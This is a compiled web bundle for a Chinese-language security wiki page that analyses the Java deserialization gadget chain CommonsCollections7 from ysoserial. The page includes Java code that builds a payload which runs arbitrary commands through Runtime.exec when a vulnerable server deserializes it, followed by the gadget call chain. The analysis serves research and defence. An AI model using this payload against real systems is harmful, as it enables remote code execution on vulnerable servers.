"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[7514],{31973:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>r,contentTitle:()=>o,default:()=>h,frontMatter:()=>t,metadata:()=>c,toc:()=>l});var a=n(85893),i=n(11151);const t={sidebar_position:1,tags:["ysoserial","PPPYSO"]},o="CommonsCollections7",c={id:"PPPYSO/gadgets/CommonsCollections/CommonsCollections7/CommonsCollections7",title:"CommonsCollections7",description:"0x01 Hashtable",source:"@site/docs/01-PPPYSO/01-gadgets/01-CommonsCollections/08-CommonsCollections7/08-CommonsCollections7.md",sourceDirName:"01-PPPYSO/01-gadgets/01-CommonsCollections/08-CommonsCollections7",slug:"/PPPYSO/gadgets/CommonsCollections/CommonsCollections7/",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections7/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/01-PPPYSO/01-gadgets/01-CommonsCollections/08-CommonsCollections7/08-CommonsCollections7.md",tags:[{label:"ysoserial",permalink:"/docs/tags/ysoserial"},{label:"PPPYSO",permalink:"/docs/tags/pppyso"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["ysoserial","PPPYSO"]},sidebar:"tutorialSidebar",previous:{title:"CommonsCollections8",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections8/"},next:{title:"CommonsCollections9\u300110",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections9 10/"}},r={},l=[{value:"0x01 Hashtable",id:"0x01-hashtable",level:2},{value:"0x02 ysoserial \u600e\u4e48\u505a\u7684",id:"0x02-ysoserial-\u600e\u4e48\u505a\u7684",level:2},{value:"0x03 LazyMap \u4e3a\u4ec0\u4e48 put yy \u548c zZ \uff1f",id:"0x03-lazymap-\u4e3a\u4ec0\u4e48-put-yy-\u548c-zz-",level:2},{value:"0x04 lazyMap2.remove(&quot;yy&quot;) \u7684\u539f\u56e0\uff1f",id:"0x04-lazymap2removeyy-\u7684\u539f\u56e0",level:2},{value:"0x05 Gadget Chain",id:"0x05-gadget-chain",level:2}];function d(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(s.h1,{id:"commonscollections7",children:"CommonsCollections7"}),"\n",(0,a.jsx)(s.h2,{id:"0x01-hashtable",children:"0x01 Hashtable"}),"\n",(0,a.jsxs)(s.p,{children:["CC7 \u662f CC6 \u7684\u5ef6\u4f38\uff0c\u4f7f\u7528\u4e86\u53e6\u4e00\u4e2a kick-off ",(0,a.jsx)(s.code,{children:"java.util.Hashtable"})," \u53bb\u8c03\u7528 ",(0,a.jsx)(s.code,{children:"LazyMap"}),"\u3002Hashtable \u4e5f\u662f JDK \u5185\u7f6e\u7684\u96c6\u5408\uff0c\u4e0e HashMap \u7684\u64cd\u4f5c\u51e0\u4e4e\u4e00\u81f4\uff0c\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e HashTable \u4e3a\u4e86\u5b9e\u73b0\u591a\u7ebf\u7a0b\u5b89\u5168\uff0c\u5728\u51e0\u4e4e\u6240\u6709\u7684\u65b9\u6cd5\u4e0a\u90fd\u52a0\u4e0a\u4e86 synchronized \u9501\uff0c\u800c\u52a0\u9501\u7684\u7ed3\u679c\u5c31\u662f ",(0,a.jsx)(s.code,{children:"HashTable"})," \u64cd\u4f5c\u7684\u6548\u7387\u5341\u5206\u4f4e\u4e0b\uff0c\u56e0\u6b64\u662f\u4e00\u4e2a\u6dd8\u6c70\u65b9\u6cd5\u3002"]}),"\n",(0,a.jsxs)(s.p,{children:["\u9996\u5148\u770b ",(0,a.jsx)(s.code,{children:"readObject()"})," \u65b9\u6cd5\uff0c\u5c06 key \u3001value \u5e8f\u5217\u5316\u4e4b\u540e\u5c06\u8c03\u7528 ",(0,a.jsx)(s.code,{children:"reconstitutionPut()"})]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230406172346827",src:n(63288).Z+"",width:"1296",height:"430"})}),"\n",(0,a.jsxs)(s.p,{children:["\u8fdb\u5165 ",(0,a.jsx)(s.code,{children:"reconstitutionPut()"})," \u540e\u4f1a\u5bf9 key \u8c03\u7528 hashCode() \u65b9\u6cd5\uff0c\u4e4b\u540e\u4f1a\u8c03\u7528 ",(0,a.jsx)(s.code,{children:"hashCode()"})," \u65b9\u6cd5\uff0c\u90a3\u4e48\u5c31\u548c HashMap \u7684\u5229\u7528\u6d41\u7a0b\u7c7b\u4f3c\u4e86"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230406173537743",src:n(45876).Z+"",width:"1194",height:"888"})}),"\n",(0,a.jsx)(s.p,{children:"\u5199\u51fa\u6765\u7684\u7ed3\u679c\u5982\u4e0b"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{className:"language-java",children:'public Hashtable getObject(final String command) throws Exception {\n\n    // Reusing transformer chain and LazyMap gadgets from previous payloads\n    final String[] execArgs = new String[]{command};\n\n    final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n\n    final Transformer[] transformers = new Transformer[]{\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer("getMethod",\n                    new Class[]{String.class, Class[].class},\n                    new Object[]{"getRuntime", new Class[0]}),\n            new InvokerTransformer("invoke",\n                    new Class[]{Object.class, Object[].class},\n                    new Object[]{null, new Object[0]}),\n            new InvokerTransformer("exec",\n                    new Class[]{String.class},\n                    execArgs),\n            new ConstantTransformer(1)};\n\n    final Map innerMap = new HashMap();\n\n    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\n    TiedMapEntry entry = new TiedMapEntry(lazyMap, "Whoopsunix");\n\n    Hashtable hashtable = new Hashtable();\n    hashtable.put(entry, "Whoopsunix");\n\n    lazyMap.clear();\n\n    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);\n\n    return hashtable;\n}\n'})}),"\n",(0,a.jsx)(s.h2,{id:"0x02-ysoserial-\u600e\u4e48\u505a\u7684",children:"0x02 ysoserial \u600e\u4e48\u505a\u7684"}),"\n",(0,a.jsxs)(s.p,{children:["\u518d\u6765\u770b\u770b ysoserial \u7684\u5b9e\u73b0\u65b9\u5f0f\uff0c\u5148\u8ddf\u8fdb\u4e00\u4e0b\u8c03\u7528\u94fe\u3002\u4ece ",(0,a.jsx)(s.code,{children:"readObject()"})," \u8fdb\u5165 ",(0,a.jsx)(s.code,{children:"Hashtable#reconstitutionPut()"})," \u540e\uff0c\u8fd9\u65f6\u5019 ",(0,a.jsx)(s.code,{children:"tab"})," \u4e3a null \uff0c\u5e76\u4e0d\u4f1a\u8fdb\u5165\u5faa\u73af\u3002"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230406235801783",src:n(76262).Z+"",width:"1590",height:"886"})}),"\n",(0,a.jsxs)(s.p,{children:["\u6240\u4ee5 CC7 \u5f80 ",(0,a.jsx)(s.code,{children:"Hashtable"})," \u6dfb\u52a0\u4e86 \u4e24\u4e2a\u5143\u7d20\uff0c\u4e8c\u6b21\u8fdb\u5165  ",(0,a.jsx)(s.code,{children:"Hashtable#reconstitutionPut()"})," \u65f6\u7531\u4e8e ",(0,a.jsx)(s.code,{children:"tab"})," \u6570\u7ec4\u4e2d\u5df2\u5b58\u5728\u7b2c\u4e00\u6b21\u63d2\u5165\u7684\u5143\u7d20\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u5728 ",(0,a.jsx)(s.code,{children:"tab"})," \u53d6\u5230\u540c\u4e3a ",(0,a.jsx)(s.code,{children:"index"})," \u4e0b\u6807\u7684\u5143\u7d20\u65f6\u5c06\u8c03\u7528 ",(0,a.jsx)(s.code,{children:"e.key.equals(key)"}),"\uff0c\u8fd9\u70b9\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u5230\u4e0e lazyMap \u4e2d\u7684 ",(0,a.jsx)(s.code,{children:"ChainedTransformer"})," \u4e0d\u76f8\u5173\u3002"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407114747157",src:n(94802).Z+"",width:"1760",height:"538"})}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230406235624985",src:n(21500).Z+"",width:"1620",height:"422"})}),"\n",(0,a.jsxs)(s.p,{children:["\u6700\u7ec8\u901a\u8fc7 ",(0,a.jsx)(s.code,{children:"AbstractMap#equals()"})," \u6765\u8c03\u7528 ",(0,a.jsx)(s.code,{children:"LazyMap.get()"})]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230406235341092",src:n(49921).Z+"",width:"1580",height:"968"})}),"\n",(0,a.jsxs)(s.p,{children:["\u5230\u76ee\u524d\u4e3a\u6b62\u7684\u601d\u8def\uff0c\u53ea\u8981\u5c06 ",(0,a.jsx)(s.code,{children:"LazyMap"})," \u653e\u5230 ",(0,a.jsx)(s.code,{children:"Hashtable"})," \u4e2d\u5c31\u884c\u4e86\uff0c\u4f46\u5b9e\u9645\u4e0a\u8fd9\u6761\u94fe\u5b50\u6bd4\u60f3\u8c61\u7684\u8981\u590d\u6742\uff0c\u6211\u4eec\u770b ysoserial \u7684\u64cd\u4f5c\uff0c\u5176\u4e2d\u4e00\u4e9b\u7ec6\u8282\u7684\u5904\u7406\u8fd8\u9700\u8981\u7ee7\u7eed\u5206\u6790\u3002"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407000935377",src:n(98578).Z+"",width:"1512",height:"756"})}),"\n",(0,a.jsx)(s.h2,{id:"0x03-lazymap-\u4e3a\u4ec0\u4e48-put-yy-\u548c-zz-",children:"0x03 LazyMap \u4e3a\u4ec0\u4e48 put yy \u548c zZ \uff1f"}),"\n",(0,a.jsxs)(s.p,{children:["\u524d\u9762\u6211\u4eec\u63d0\u5230\u4f1a\u4e8c\u6b21\u8fdb\u5165 ",(0,a.jsx)(s.code,{children:"Hashtable#reconstitutionPut()"})," \uff0c\u56e0\u4e3a\u7b2c\u4e8c\u6b21 ",(0,a.jsx)(s.code,{children:"tab[index]"})," \u5143\u7d20\u5b58\u5728\u6240\u4ee5\u80fd\u8c03\u7528 ",(0,a.jsx)(s.code,{children:"equals()"})," \uff0cindex \u503c\u901a\u8fc7\u8ba1\u7b97\u5b57\u7b26\u7684hash\u5f97\u5230\uff0c\u90a3\u4e48\u4e3a\u4ec0\u4e48\u4e0d\u80fd put \u4e24\u4e2a\u76f8\u540c\u7684\u503c\uff1f"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407101519492",src:n(34893).Z+"",width:"1168",height:"288"})}),"\n",(0,a.jsxs)(s.p,{children:["\u56e0\u4e3a\u5728\u8fdb\u5165 ",(0,a.jsx)(s.code,{children:"Hashtable#readObject()"})," \u65f6\uff0c\u4f1a\u8ba1\u7b97\u5143\u7d20\u7684\u4e2a\u6570\uff0c\u4e24\u4e2a\u5143\u7d20\u76f8\u540c elements \u4e3a1 \u5c31\u65e0\u6cd5\u4e8c\u6b21\u8fdb\u5165\u4e86\u3002"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407101835655",src:n(63342).Z+"",width:"1366",height:"168"})}),"\n",(0,a.jsxs)(s.p,{children:["\u6240\u4ee5\u8fd9\u4e2a\u95ee\u9898\u7684\u539f\u56e0\u4e5f\u5c31\u663e\u800c\u6613\u89c1\u662f\u4e00\u4e2a ",(0,a.jsx)(s.a,{href:"https://www.jianshu.com/p/9ad7fdb46efb",children:"hash\u78b0\u649e\u95ee\u9898"})," \uff0c\u4fe9\u5b57\u7b26\u4e32 hashCode() \u76f8\u540c\u3002\u7c7b\u4f3c\u7684\u5b57\u7b26\u8fd8\u6709\u5f88\u591a\uff0c\u6bd4\u5982 ",(0,a.jsx)(s.code,{children:"Aa BB"}),"\u3001",(0,a.jsx)(s.code,{children:"3Qj 42j"}),"\u3001",(0,a.jsx)(s.code,{children:"\u4e09\u4e2a \u4e0a\u4e0b"})]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407103337102",src:n(69376).Z+"",width:"938",height:"276"})}),"\n",(0,a.jsx)(s.h2,{id:"0x04-lazymap2removeyy-\u7684\u539f\u56e0",children:'0x04 lazyMap2.remove("yy") \u7684\u539f\u56e0\uff1f'}),"\n",(0,a.jsxs)(s.p,{children:["\u628a ",(0,a.jsx)(s.code,{children:"remove()"})," \u6ce8\u91ca\u6389\u540e\u518d\u8c03\u8bd5\uff0c\u53d1\u73b0\u5728 ",(0,a.jsx)(s.code,{children:"AbstractMap#equals()"})," \u4e2d ",(0,a.jsx)(s.code,{children:"m.size() != size()"})," \u8fd4\u56de false \uff0c\u6240\u4ee5\u65e0\u6cd5\u7ee7\u7eed\u4e0b\u9762\u7684\u8c03\u7528\u3002"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407110442010",src:n(30377).Z+"",width:"1506",height:"474"})}),"\n",(0,a.jsxs)(s.p,{children:["\u800c\u6211\u4eec\u5bf9 ",(0,a.jsx)(s.code,{children:"equals()"})," \u6253\u65ad\u70b9\u540e\u4f1a\u53d1\u73b0\u5728\u6267\u884c  ",(0,a.jsx)(s.code,{children:"hashtable.put(lazyMap2, 2)"})," \u65f6\u4f1a\u518d\u8fdb\u5165\u4e00\u6b21\u3002"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407110727085",src:n(80276).Z+"",width:"838",height:"184"})}),"\n",(0,a.jsxs)(s.p,{children:["\u56e0\u4e3a\u6267\u884c ",(0,a.jsx)(s.code,{children:"put()"})," \u65b9\u6cd5\u65f6\u4e5f\u662f\u7c7b\u4f3c\u7684\u539f\u7406\uff0c ",(0,a.jsx)(s.code,{children:"hashtable.put(lazyMap2, 2)"})," \u65f6\uff0c\u5373\u4e8c\u6b21\u8fdb\u5165\u65f6\u4f1a\u4ece ",(0,a.jsx)(s.code,{children:"tab[index]"})," \u4e2d\u53d6\u5148\u524d\u653e\u8fdb\u53bb\u7684 ",(0,a.jsx)(s.code,{children:"hashCode"})," \u76f8\u540c\u7684 ",(0,a.jsx)(s.code,{children:"yy"}),"\uff0c\u5e76\u4ee5\u6b64\u6267\u884c\u4e00\u6b21 ",(0,a.jsx)(s.code,{children:"equals()"})," \uff0c"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407113856218",src:n(98803).Z+"",width:"2634",height:"550"})}),"\n",(0,a.jsxs)(s.p,{children:["\u5728\u8fdb\u5165 ",(0,a.jsx)(s.code,{children:"LazyMap.get()"})," \u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u6784\u9020\u597d\u540e\u518d\u901a\u8fc7\u53cd\u5c04\u4fee\u6539 ",(0,a.jsx)(s.code,{children:"iTransformers"})," \uff0c\u6240\u4ee5\u8fd9\u65f6 value \u4f1a\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4f20\u5165\u7684 key \u503c ",(0,a.jsx)(s.code,{children:"yy"}),"\u3002"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407113527301",src:n(25945).Z+"",width:"852",height:"272"})}),"\n",(0,a.jsxs)(s.p,{children:["\u6240\u4ee5\u6700\u7ec8 map \u4e2d\u4f1a\u591a\u4e00\u4e2a ",(0,a.jsx)(s.code,{children:"yy yy"})," \u7684\u503c\uff0c\u9700\u8981 remove()"]}),"\n",(0,a.jsx)(s.p,{children:(0,a.jsx)(s.img,{alt:"image-20230407112953974",src:n(42346).Z+"",width:"1660",height:"824"})}),"\n",(0,a.jsx)(s.h2,{id:"0x05-gadget-chain",children:"0x05 Gadget Chain"}),"\n",(0,a.jsx)(s.pre,{children:(0,a.jsx)(s.code,{children:"Hashtable.readObject()\n   TiedMapEntry.hashCode()\n        LazyMap.get()\n            ChainedTransformer.transform()\n                ConstantTransformer.transform()\n                    InvokerTransformer.transform()\n\n\n\nHashtable.readObject()\n   AbstractMap.equals()\n        LazyMap.get()\n            ChainedTransformer.transform()\n                ConstantTransformer.transform()\n                    InvokerTransformer.transform()\n"})})]})}function h(e={}){const{wrapper:s}={...(0,i.a)(),...e.components};return s?(0,a.jsx)(s,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},63288:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230406172346827-42b6baff5742a1416ec4010b630832f7.png"},45876:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230406173537743-9d617193bf7f6763f6cfda21c6b949ca.png"},49921:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230406235341092-47d72e82bbc37b1ed6ca18e98ff1b74d.png"},21500:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230406235624985-886b1ff826343a61ac03f1dae0b9785e.png"},76262:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230406235801783-26e3ed97d3ba844ce5b94d956758e3de.png"},98578:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407000935377-a96754a9edf9071ea655d52193923dd4.png"},34893:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407101519492-ef4cb07b97bf7759223348d70ff7fedc.png"},63342:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407101835655-7c9845e2458cc750c1eba411718e0f4c.png"},69376:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407103337102-73966fb630142060329b26a52bb85b91.png"},30377:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407110442010-2d82717dba4e677e71123cd609524211.png"},80276:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407110727085-e2b5ca4e7f518ac211fc1684e9fc1ce5.png"},42346:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407112953974-ead219ae1d3ed58c356212089fc86d63.png"},25945:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407113527301-4f987e02fb235a0a0f62b9f50132c8be.png"},98803:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407113856218-b1e62e2d1d885be28042a376d47326c5.png"},94802:(e,s,n)=>{n.d(s,{Z:()=>a});const a=n.p+"assets/images/image-20230407114747157-3329846ec435effbf718cdf7c5bc4473.png"},11151:(e,s,n)=>{n.d(s,{Z:()=>c,a:()=>o});var a=n(67294);const i={},t=a.createContext(i);function o(e){const s=a.useContext(t);return a.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),a.createElement(t.Provider,{value:s},e.children)}}}]);